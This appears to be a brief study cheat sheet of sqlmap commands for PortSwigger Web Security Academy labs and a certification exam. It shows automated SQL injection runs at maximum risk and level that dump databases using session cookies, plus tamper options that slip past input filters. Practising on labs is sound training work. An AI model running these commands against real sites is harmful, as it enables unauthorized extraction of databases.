---
title: "SQLmap"
---

# SQLmap

```bash
sqlmap -u "https://0a1200ad04a9880880f2085b008f00a4.web-security-academy.net/filter
?category=Pets" -p category --cookie="session=Y5a9jJHndtnnWn8gwaZ0l4vuI10D8QrT" --batch --risk 3 --level 5 --dump
```

```bash
sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*&organizeby=DATE&blog_artist=" --
cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs --dump
```

```bash
--tamper=space2comment,between,percentage
```
